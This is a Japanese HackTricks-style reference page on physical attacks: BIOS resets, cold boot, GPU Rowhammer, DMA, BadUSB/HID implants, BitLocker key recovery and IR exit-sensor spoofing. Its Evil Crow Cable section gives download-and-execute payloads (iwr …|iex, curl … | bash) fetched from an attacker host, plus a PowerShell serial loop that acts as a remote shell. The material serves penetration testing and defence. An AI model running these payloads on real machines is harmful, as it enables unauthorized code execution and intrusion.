# 物理攻撃

{{#include ../banners/hacktricks-training.md}}

## BIOSパスワードの復旧とシステムセキュリティ

レガシーPCのファームウェア設定は、CMOSバッテリーを取り外すか、マニュアルに記載されたCMOSクリア用ジャンパーを使用してリセットできる場合があります。必要な電源オフ時間はマザーボードによって異なります。また、最新のUEFIパスワードやキーは不揮発性フラッシュメモリ、組み込みコントローラー、またはセキュリティデバイスに保存されている場合があり、バッテリーを取り外しても保持されることがあります。ピンをショートさせる前に、マザーボードまたはサービスマニュアルを確認してください。この操作によってTPMの測定値が無効になり、ディスク暗号化のリカバリーが必要になる場合もあります。

レガシーx86システムでは、**killCMOS**や**CmosPwd**などのツールを使って、起動可能な環境からCMOSに保存された設定を調査または変更できます。CmosPwdは、旧式BIOSの既知のファミリーにおけるパスワード形式を識別し、CMOSの状態をバックアップ、復元、消去または破棄できます。公開されているビルドは、レガシーなDOS/Windows、Linux、FreeBSD、NetBSD環境を対象としています。<sup>[[18]](#references)</sup> これらのユーティリティは、汎用的なUEFIパスワード削除ツールではなく、十分なハードウェア／ファームウェアへのアクセスが必要です。

一部のノートPCのファームウェアでは、パスワード入力に何度か失敗すると、ベンダー固有のチャレンジコードが表示されます。[bios-pw.org](https://bios-pw.org)などのデータベースでは、一部のモデルについてレガシーなベンダーのリカバリーパスワードを導出できますが、多くのシステムでは、導出可能なチャレンジを使わずにロックアウトが実装されています。生成されたパスワードはモデル固有のものとして扱い、試行回数の上限を使い切らないようにしてください。

### UEFIセキュリティ

最新の**UEFI**システムでは、CHIPSECを使ってSecure Boot変数の保護を監査できます。まずは、以下の変更を加えないチェックから始めてください。オプションの`-a modify`モードは変数の破損を意図的に試みるため、復旧可能なラボシステムでのみ使用してください。CHIPSEC自体も、特権ドライバーと低レベルのハードウェアアクセスは本番環境のエンドポイントには適さないと警告しています。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM解析とCold Boot Attacks

DRAMは、リフレッシュが停止しても、すべてのビットが直ちに失われるわけではありません。データの減衰速度はモジュールの技術や温度によって大きく異なり、冷却すれば、電源を切った状態よりもはるかに長く有用なデータを保持できます。Cold-boot attackでは、小規模な取得環境へすばやく再起動するか、冷却したモジュールを移設して生メモリを取得し、ビットの減衰があっても暗号鍵を再構築します。ディスクコピー用ユーティリティが物理メモリのイメージ取得にも使えるとは限らず、Volatilityは取得ではなくキャプチャの解析に使います。プラットフォームに適合した、検証済みの取得ツールを使用してください。<sup>[[12]](#references)</sup>

---

## ページテーブルを狙うGPU Rowhammer

最新のGPU Rowhammer攻撃は、通常のバッファではなく**GPU仮想メモリのメタデータ**を標的にすると、より有効になります。**GDDR6搭載のNVIDIA Ampere GPU**に関する最近の研究では、権限のないCUDAコードを実行する攻撃者が、GPU固有のハンマリングパターンを作成し、**memory massaging**でページング構造を脆弱な行に配置してから、**最終レベルページテーブル**または中間の**ページディレクトリ**のビットを反転できることが示されています。単一の変換エントリが破損すれば、攻撃者は**任意のGPUメモリ読み書き**を実現し、そこからホストの侵害へと移行できます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6で**ハンマリング可能な行を特定**し、DRAM内の緩和策を回避する、リフレッシュを考慮した不均一なハンマリングパターンを作成します。
2. ドライバーがページ変換構造を既定の保護プールに保持せず、ハンマリング可能な物理位置に配置するように、**GPUの割り当てを調整**します。実際には、低メモリのページテーブル領域を使い果たし、制御したストライドで大規模な疎UVMマッピングを大量に作成する方法などがあります。
3. ページテーブルまたはページディレクトリエントリ内の**PFN**やアパーチャ関連ビットなどの**変換メタデータを反転**させ、攻撃者が制御する仮想ページがページテーブルページ、任意のGPUメモリ、またはホストから参照可能なシステムマッピングに解決されるようにします。
4. 偽造したマッピングを再利用して追加の変換エントリを書き換え、GPUコンテキストをまたぐ**任意のGPUメモリ読み書き**へと権限を拡大します。

### Host Pivot and Mitigations

- **IOMMUが無効**の場合、偽造したシステムアパーチャマッピングにより、GPUから任意の**ホスト物理メモリ**にアクセスできるため、GPUのプリミティブを使ってホストを完全に侵害できます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**は最終レベルページテーブルのエントリを標的にします。一方、**GeForge**では、1ビットの反転でより大きな変換サブツリーの参照先を変更できるため、ページディレクトリのレベルを破損させるほうが容易な場合があることが示されています。ページング層のうち1つだけをセキュリティ上重要とみなさないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**は、GDDRHammer/GeForgeが使うホストメモリへの直接的な任意アクセスを阻止するため、依然として重要ですが、**完全な緩和策ではありません**。**GPUBreach**では、攻撃者がGPUから書き込み可能なドライバー所有のCPUバッファを破損させ、その後NVIDIAドライバーのメモリ安全性バグを引き起こして、IOMMUが有効でもカーネル書き込みプリミティブと**root shell**を取得する、第2段階の移行が示されています。<sup>[[3]](#references)</sup>
- 対応するワークステーション／サーバーGPUでは、**システムレベルECC**が実用的な強化策です。ECC非対応のコンシューマー向けGPUでは、防御の選択肢が限られます。<sup>[[4]](#references)</sup>
- これらの攻撃は純粋な理論上のものではありません。**GeForge**は、RTX 3060で**1,171**回、RTX A6000で**202**回のビット反転を報告しており、ホストの権限昇格チェーンを成立させるのに十分でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

起動前のIOMMU適用を弱め、Windows DMAチェーンを可能にする、オフラインでのUEFI IFR/NVRAMパッチについては、以下を参照してください。

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**は、FireWireや初期のThunderbolt構成などのインターフェースを介した**DMAベースのメモリ取得とパッチ適用**を実証しており、過去のログインバイパスの手法も含まれます。単に「Windows 10では効果がない」というわけではありません。悪用可能かどうかは、インターフェース、対象ビルド、IOMMUポリシー、ロック状態、Windows Kernel DMA Protectionがサポートされ有効になっているかによって異なります。Windows 10 version 1803以降では、互換性のあるプラットフォームでKernel DMA Protectionが導入され、攻撃対象領域が大きく変わりました。<sup>[[13]](#references)[[14]](#references)</sup>

---

## システムアクセスのためのLive CD/USB

暗号化されていない、またはすでにロック解除されているWindowsボリュームでは、オフライン環境から**sethc.exe**や**Utilman.exe**などのアクセシビリティ用バイナリを**cmd.exe**に置き換えることで、該当するログオン画面のショートカットを実行したときにSYSTEMのコマンドプロンプトを起動できます。**chntpw**などのツールで、ローカルSAMアカウントのデータを編集できます。これらの方法でロックされたBitLockerボリュームをバイパスすることはできず、DPAPI/EFSで保護された認証情報を損傷するおそれがあります。フォレンジック用コピーとバックアップを保管してください。

**Kon-Boot**は、対応するWindows/macOS構成で使える、商用の起動時認証バイパスツールです。互換性はOS、ファームウェアモード、Secure Boot、ディスク暗号化の構成によって異なり、BitLockerでロックされたボリュームを復号することはできません。<sup>[[10]](#references)</sup>

---

## Windowsのセキュリティ機能への対処

### 起動と回復のショートカット

- **Delete/Supr**、F2、F10、またはベンダー指定のキーでファームウェア設定を開ける場合があります。
- **F8**で従来のWindows詳細ブートオプションを開けるのは、その経路が有効な構成に限られます。現在の回復メニューへの入り方は構成によって異なります。
- **Shift**を押し続けると、一部の構成ではWindowsの自動ログオンを抑止できます。ただし、ポリシーやレジストリの設定でこの動作を無効にできます。<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky**やTeensyボードなどのデバイスは、信頼されたHIDキーボードとして認識され、あらかじめ定義したキー入力を注入できます。ペイロードが最初に持つのは、ログオン済みセッションの権限とデスクトップへのアクセスです。UACプロンプト、画面ロック、キーボードレイアウト、タイミング、エンドポイントのUSBポリシーによる制約も受けます。<sup>[[15]](#references)</sup>

プログラム可能な周辺機器は、ホストのカーネルパーサーを攻撃したり、複数のUSBデバイスを連携させてheap groomingや情報開示を行ったりすることもできます。

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

管理者権限またはバックアップ権限があれば、シャドウコピーを作成したり、レジストリハイブを保存したりして、ロックされた**SAM**や**SYSTEM**などのファイルを取得できます。これは侵害後の収集手法であり、権限昇格のバイパスではありません。`diskshadow`/VSSのイベントやレジストリハイブのエクスポートイベントと照合してください。

## BadUSB / HID Implant Techniques

### NFC-triggered Android HID gadget

root化されたAndroid端末をプログラム可能なUSBキーボードとして使えるのは、そのUSBコントローラーとカーネルが**USB gadget/HIDサポート**を提供している場合に限られます。対応端末では、Kali NetHunterの**USB Arsenal**からgadgetプロファイルを利用できます。[USB Gadget Tool](https://github.com/tejado/android-usb-gadget)も選択肢の1つです。ConfigFS gadget機能を作成し、`/dev/hidg0`や`/dev/hidg1`などのキーボード／マウス用キャラクターデバイスを公開する場合があります。このツールが作成するのはgadgetエンドポイントだけであり、HIDレポートの書き込みには別のプロセスが必要です。root権限があっても、ConfigFS、HID gadgetサポート、または使用可能なUSB Device Controllerを備えていないカーネルを補うことはできません。<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

このエンドポイントは、物理的なトリガーとしてAndroid NFCと組み合わせられます。[NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)アプリはタグのUIDを読み取り、想定される形式に変換し、ローカルの許可リストと照合します。一致した場合、設定済みのRubber Ducky風キーボードシーケンスを送信します。接続先のホストからは通常のキーボード入力に見えるため、NFC用ソフトウェアは必要ありません。<sup>[[22]](#references)[[24]](#references)</sup>

ショートカットやコマンドを使う前に、空のテキストエディターでデバイスの認識とキーボードレイアウトを検証してください。無害なペイロードの例を示します。<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

重要な信頼境界:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelistは識別であり、認証ではありません**。UIDは公開情報であり、一部のトークンタイプやエミュレーターでは複製やなりすましが可能です。許可されたUIDをコピーすると、元のトークンと同じディスパッチ経路をたどります。
- **NfcScreenOff** Magisk moduleはNFC serviceにパッチを適用し、画面がオンでロック解除されているかのように動作させます。スマートフォンがすでにhostに接続されている場合、スマートフォンのロックを解除せずにpayloadを実行できる可能性があります。
- payloadに保存されたpassword、API token、commandは、root化済み、またはbootloaderのロックが解除されたデバイスでは復元可能なsecretです。HID経由でpasswordを入力するのは、再利用可能なpasswordの自動入力であり、passwordless authenticationではありません。
- HID injectionはアクティブなdesktopの権限で動作し、フォーカス、タイミング、hostのキーボードレイアウトに依存します。機密性の高い操作を実行する前に直近のユーザー確認を必須にし、scriptに特権を伴うsecretを含めないようにし、実際のauthenticationにはcryptographic challenge-response authenticatorを使用してください。

### Wi-Fi管理型ケーブルimplant

- **Evil Crow Cable Wind**のようなESP32-S3ベースのimplantは、USB-A→USB-CまたはUSB-C↔USB-Cケーブル内に隠れ、USB keyboardとしてのみenumerateし、Wi-Fi経由でC2 stackを公開します。操作者は被害者のhostからケーブルに給電し、名前を`Evil Crow Cable Wind`、passwordを`123456789`に設定したhotspotを作成して、[http://cable-wind.local/](http://cable-wind.local/)（またはそのDHCP address）を開くだけで、組み込みHTTP interfaceにアクセスできます。<sup>[[8]](#references)</sup>
- ブラウザー UI には、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* のタブがあります。保存された payload には OS ごとのタグが付けられ、キーボードレイアウトは実行中に切り替えられます。また、VID/PID の文字列を変更して既知の周辺機器になりすますことができます。
- C2 はケーブル内にあるため、スマートフォンから payload の準備、実行のトリガー、Wi-Fi 認証情報の管理を行え、組織のネットワークを使う必要がありません。これは、物理的侵入の滞在時間が短い場合に有用です。

### OS 対応の AutoExec payload

- AutoExec ルールでは、USB enumeration の直後に実行する payload を 1 つ以上指定します。implant は簡易的な OS fingerprinting を行い、一致するスクリプトを選択します。
- ワークフローの例:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）または `CTRL ALT T`（terminal）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 実行はユーザーの操作なしで行われるため、充電ケーブルを交換するだけで、ログオン中のユーザーコンテキストで「plug-and-pwn」による初期アクセスを実現できます。

### Wi-Fi TCP 経由の HID 起動型 remote shell

1. **Keystroke bootstrap:** 保存された payload がコンソールを開き、新しい USB serial デバイスから届いた内容を実行するループを貼り付けます。Windows 向けの最小構成は次のとおりです:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** implantはUSB CDC channelを開いたまま、ESP32-S3でTCP client（Python script、Android APK、またはdesktop executable）を起動し、operatorへ接続します。TCP sessionに入力されたバイト列は上記のserial loopに転送されるため、air-gapped hostでもremote command executionが可能です。出力は限られているため、operatorは通常、blind command（アカウント作成、追加ツールの配置など）を実行します。

### HTTP OTA update surface

- ドキュメントに記載されたEvil Crow Cable Wind interfaceは、認証不要のfirmware-update endpoint `/update` を公開しています。<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operatorは、ケーブルを開けずに作戦中でも機能をホットスワップできます（例: flash USB Army Knife firmware）。これにより、対象ホストに接続したままimplantに新たな機能を追加できます。

## BitLocker暗号化のバイパス

稼働中、または最近稼働していたシステムを認可を得てフォレンジック取得すると、ボリュームがロック解除されている間にBitLockerのボリュームマスターキーや関連するキー素材が含まれている場合があります。Elcomsoft Forensic Disk DecryptorやPassware Kit Forensicなどの商用ツールは、対応するメモリイメージ、休止状態ファイル、クラッシュダンプを検索できますが、必ず成功するとは限りません。また、BitLockerが有効な場合、最新のWindowsではクラッシュダンプも暗号化されます。保存されている48桁の回復パスワードは、メモリ内のボリュームキーとは別のデータです。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 回復キーを追加させるソーシャルエンジニアリング

攻撃者は、管理者を説得してBitLocker管理コマンドを実行させることで、回復パスワード、外部キー、その他のプロテクターを追加し、それを取得できます。回復パスワードには、任意のゼロ文字列を指定できません。BitLockerの数値回復パスワードには、検証済みの48桁形式が必要です。認可された管理で使用する構文は `manage-bde -protectors -add C: -recoverypassword` です。追加されたプロテクターは `manage-bde -protectors -get C:` で一覧表示できます。プロテクターの追加を監視し、新しい回復情報が承認済みの場所にのみエスクローされるようにしてください。<sup>[[16]](#references)</sup>

---

## シャーシ侵入／メンテナンススイッチを悪用したBIOSの工場出荷時リセット

最新のノートPCや小型デスクトップの多くには、Embedded Controller（EC）とBIOS/UEFIファームウェアによって監視される**シャーシ侵入スイッチ**が搭載されています。主な目的は、デバイスが開けられたときにアラートを発することですが、ベンダーによっては、スイッチを特定のパターンで切り替えると起動する**非公開のリカバリーショートカット**を実装している場合があります。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻撃の仕組み

1. スイッチはECの**GPIO割り込み**に接続されています。
2. EC上で動作するファームウェアが、**押された回数とタイミング**を記録します。
3. ハードコードされたパターンが認識されると、ECは*mainboard-reset*ルーチンを実行し、**システムのNVRAM/CMOSの内容を消去**します。
4. 次回の起動時に、該当モデルはリセットされたファームウェア状態を読み込みます。ベンダーやリビジョンによって、消去される状態には、スーパーバイザーパスワード、カスタムブート設定、登録済みのSecure Bootキーが含まれる場合があります。TPMの状態とディスク暗号化への影響は、別途評価する必要があります。

> ファームウェアをリセットすると外部デバイスからのブートが可能になる場合がありますが、ストレージの暗号化は解除されません。BitLockerなどのフルディスク暗号化システムは、TPMやファームウェアの変更後に回復モードに入る場合がありますが、回復キーがなければ内蔵ドライブは引き続き保護されます。<sup>[[16]](#references)</sup>

### 実例 – Framework 13 Laptop

Framework 13（第11/12/13世代）のリカバリーショートカットは次のとおりです。

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

10回目のサイクル後、ECは次回の再起動時にBIOSがNVRAMを消去するよう指示するフラグを設定します。手順全体にかかる時間は約40秒で、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>

### 一般的なExploit手順

1. ECが動作するよう、対象の電源を入れるか、サスペンドから復帰させます。
2. 底面カバーを外し、侵入検知スイッチ／メンテナンススイッチを露出させます。
3. ベンダー固有の切り替えパターンを再現します（ドキュメントやフォーラムを確認するか、ECファームウェアをリバースエンジニアリングします）。
4. 組み立て直して再起動し、実際に変更されたファームウェア設定や認証情報を調べます。
5. 許可を得ており、外部メディアからの起動が可能な場合は、管理下にあるライブイメージを起動します。内部ボリュームのロックを正規の方法で解除できた場合（または、暗号化されていなかった場合）、ライブ環境から認証情報やデータを取得したり、EFI System Partitionを調査したりできます。このパーティションを変更してEFI implantをインストールする行為は、永続的かつ非常に侵襲的であり、Secure Boot、measured boot、ファームウェア書き込み保護、エンドポイント監視による制約を受けます。暗号化ストレージは、鍵または回復情報がなければアクセスできません。

### 検知と緩和策

* OS管理コンソールで筐体侵入イベントを記録し、予期しないBIOSリセットと相関分析します。
* 開封を検知できるよう、ネジやカバーに**開封検知シール**を使用します。
* デバイスを**物理的に管理された場所**に保管し、物理アクセスは完全な侵害につながると想定します。
* 利用可能な場合は、ベンダーの「メンテナンススイッチによるリセット」機能を無効にするか、NVRAMのリセットに追加の暗号学的認証を必須にします。

---

## 非接触型退出センサーに対するCovert IR Injection

### センサーの特性
- 一般的な「手をかざして退出」センサーは、近赤外線LEDエミッターとTVリモコン方式の受信モジュールを組み合わせています。受信モジュールは、正しい搬送波（約30 kHz）のパルスを複数回（約4～10回）受信した後にのみ、ロジックHighを出力します。<sup>[[7]](#references)</sup>
- プラスチック製の覆いによってエミッターと受信機が互いを直接見通せないため、コントローラーは検証済みの搬送波が近くの反射によるものと判断し、リレーを駆動してドアストライクを解錠します。
- コントローラーが対象物の存在を検知すると、送信する変調エンベロープを変更することがよくありますが、受信機はフィルター処理された搬送波に一致するバーストを引き続き受け入れます。

### 攻撃の流れ
1. **発光パターンを取得する** – コントローラーのピンにロジックアナライザーを接続し、内部IR LEDを駆動する検知前と検知後の両方の波形を記録します。
2. **「検知後」の波形だけを再生する** – 標準のエミッターを取り外すか無視し、外部IR LEDを最初からトリガー済みのパターンで駆動します。受信機はパルス数と周波数だけを基準にするため、偽装した搬送波を本物の反射とみなし、リレー信号をアサートします。
3. **送信をゲート制御する** – 調整したバースト（例：数十ミリ秒オン、同程度オフ）で搬送波を送信し、受信機のAGCや干渉処理ロジックを飽和させずに、必要最小限のパルス数を送ります。連続発光ではセンサーの感度がすぐに低下し、リレーが作動しなくなります。

### 長距離反射Injection
- 卓上用LEDを高出力IRダイオード、MOSFETドライバー、集光光学系に置き換えることで、約6 m離れた場所から安定してトリガーできます。
- 攻撃者が受信機の開口部を見通す必要はありません。ガラス越しに見える室内の壁、棚、ドア枠にビームを当てれば、反射光が約30°の視野に入り、近距離で手をかざしたように見せられます。
- 受信機は弱い反射光を想定しているため、外部からの強いビームは複数の面で反射しても、検知しきい値を上回る場合があります。

### Weaponised Attack Torch
- ドライバーを市販の懐中電灯に内蔵すれば、ツールを目立たない形で持ち運べます。可視光LEDを受信機の波長帯に適合する高出力IR LEDに交換し、ATtiny412（または同等品）で約30 kHzのバーストを生成して、MOSFETでLED電流を吸い込みます。
- 伸縮式ズームレンズでビームを絞って到達距離と精度を高め、MCU制御の振動モーターで、可視光を出さずに変調が有効であることを触覚で知らせます。
- 複数の保存済み変調パターン（わずかに異なる搬送波周波数やエンベロープ）を切り替えることで、ブランドを変更して販売されているセンサー製品間の互換性を高められます。操作者は反射面に順番に照射し、リレーの作動音とドアの解錠を確認できます。

---

## References

- [1] [GDDRHammer: DRAM行を大きく乱す — 最新GPUを利用したコンポーネント横断Rowhammer攻撃](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDRメモリをHammerしてGPUページテーブルを偽造する手法](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammerを利用したGPUへの権限昇格攻撃](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - セキュリティ通知: Rowhammer - 2025年7月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – 「Framework 13. ここを押してpwn」](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – メインボードのリセットガイド](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – 「触らないで！ – Covert IR TorchによるIR非接触型退出センサーの回避」](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – 「接続、実行、pwn: Evil Crow Cable Windを使ったHacking」](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIAチップに対するRowhammer攻撃](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot公式ドキュメントと互換性情報](https://kon-boot.com/)
- [11] [CHIPSECドキュメント - Secure Boot変数の保護](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [忘れないために: 暗号鍵に対するCold Boot攻撃](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMAによる物理メモリ操作](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Duckyドキュメント](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker操作ガイド](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shiftキーを押しながらの操作と自動ログオンの挙動](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwdのドキュメントとダウンロード](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linuxドキュメント - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linuxカーネルドキュメント - USB HID gadgetドライバー](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Root化したAndroidスマートフォンをPC用NFC認証器および自動化ツールにする](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
